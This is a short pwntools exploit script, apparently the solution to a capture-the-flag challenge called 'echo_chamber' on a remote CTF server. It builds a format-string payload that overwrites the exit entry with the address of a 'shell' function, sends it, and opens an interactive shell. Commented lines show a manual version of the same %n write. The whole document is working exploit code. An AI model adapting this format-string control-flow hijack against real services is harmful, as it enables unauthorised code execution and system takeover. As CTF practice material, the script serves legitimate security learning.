from pwn import *
import struct

io = remote('chals.cyberthon22t.ctf.sg', 20301)
elf = context.binary = ELF('echo_chamber')
win_addr = elf.symbols['shell']
print(win_addr)
exit_plt = 0x601040

# payload = struct.pack('I', exit_plt)
# payload += b'AAAABBBBCCCCDDDDEEEE'
# # payload += b'%x ' * 10
# payload += b'%6$4196122x '
# payload += b'%6$n'

payload = fmtstr_payload(6, {exit_plt: win_addr}, write_size='long')
io.sendline(payload)
io.interactive()
